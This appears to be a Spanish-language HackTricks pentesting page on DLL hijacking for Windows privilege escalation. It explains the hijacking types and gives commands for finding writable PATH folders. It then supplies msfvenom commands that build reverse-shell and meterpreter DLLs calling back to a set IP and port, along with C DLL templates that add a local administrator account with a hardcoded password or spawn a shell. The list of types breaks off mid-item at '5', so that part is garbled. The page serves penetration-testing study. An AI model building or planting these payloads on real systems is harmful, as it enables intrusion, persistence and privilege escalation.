# Secuestro de DLL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y en hackear lo imposible - ¡estamos contratando! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definición

En primer lugar, aclaremos la definición. El secuestro de DLL es, en el sentido más amplio, **engañar a una aplicación legítima/confiable para que cargue una DLL arbitraria**. Términos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ y _DLL Side-Loading_ a menudo se usan -equivocadamente- para decir lo mismo.

El secuestro de DLL se puede utilizar para **ejecutar** código, obtener **persistencia** y **escalar privilegios**. De estos 3, el **menos probable** de encontrar es la **escalada de privilegios** con mucho. Sin embargo, como esto es parte de la sección de escalada de privilegios, me centraré en esta opción. Además, tenga en cuenta que, independientemente del objetivo, un secuestro de DLL se realiza de la misma manera.

### Tipos

Hay una **variedad de enfoques** para elegir, y el éxito depende de cómo se configure la aplicación para cargar sus DLL requeridas. Los enfoques posibles incluyen:

1. **Reemplazo de DLL**: reemplazar una DLL legítima con una DLL maliciosa. Esto se puede combinar con _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], que garantiza que toda la funcionalidad de la DLL original permanezca intacta.
2. **Secuestro del orden de búsqueda de DLL**: las DLL especificadas por una aplicación sin una ruta se buscan en ubicaciones fijas en un orden específico \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. El secuestro del orden de búsqueda se produce colocando la DLL maliciosa en una ubicación que se busca antes de la DLL real. Esto a veces incluye el directorio de trabajo de la aplicación objetivo.
3. **Secuestro de DLL fantasma**: dejar caer una DLL maliciosa en lugar de una DLL faltante/inexistente que una aplicación legítima intenta cargar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirección de DLL**: cambiar la ubicación en la que se busca la DLL, por ejemplo, editando la variable de entorno `%PATH%`, o los archivos `.exe.manifest` / `.exe.local` para incluir la carpeta que contiene la DLL maliciosa \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verificar los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes verificar las importaciones de un ejecutable y las exportaciones de una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obtener una guía completa sobre cómo **abusar del secuestro de DLL para escalar privilegios** con permisos para escribir en una carpeta de **ruta del sistema**, consulte:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Herramientas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará si tiene permisos de escritura en alguna carpeta dentro de la ruta del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll_.

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una DLL que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, tenga en cuenta que el secuestro de DLL es útil para [escalar desde el nivel de integridad medio a alto **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) o desde **Alta integridad a SYSTEMA**. Puede encontrar un ejemplo de **cómo crear una DLL válida** dentro de este estudio de secuestro de DLL centrado en el secuestro de DLL para la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puede encontrar algunos **códigos DLL básicos** que pueden ser útiles como **plantillas** o para crear una **DLL con funciones no requeridas exportadas**.

## **Creación y compilación de DLLs**

### **Proxificación de DLL**

Básicamente, un **proxy de DLL** es una DLL capaz de **ejecutar su código malicioso cuando se carga**, pero también de **exponer** y **funcionar** como **se espera** mediante el **reenvío de todas las llamadas a la biblioteca real**.

Con la herramienta **** [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) **** o **** [**Spartacus**](https://github.com/Accenture/Spartacus) ****, en realidad puede **indicar un ejecutable y seleccionar la biblioteca** que desea proxificar y **generar una DLL proxificada** o **indicar la DLL** y **generar una DLL proxificada**.

### **Meterpreter**

**Obtener shell inversa (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Propio

Tenga en cuenta que en varios casos, la Dll que compile debe **exportar varias funciones** que serán cargadas por el proceso víctima, si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y en hackear lo imposible, ¡**estamos contratando!** (_se requiere fluidez en polaco, tanto hablado como escrito_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
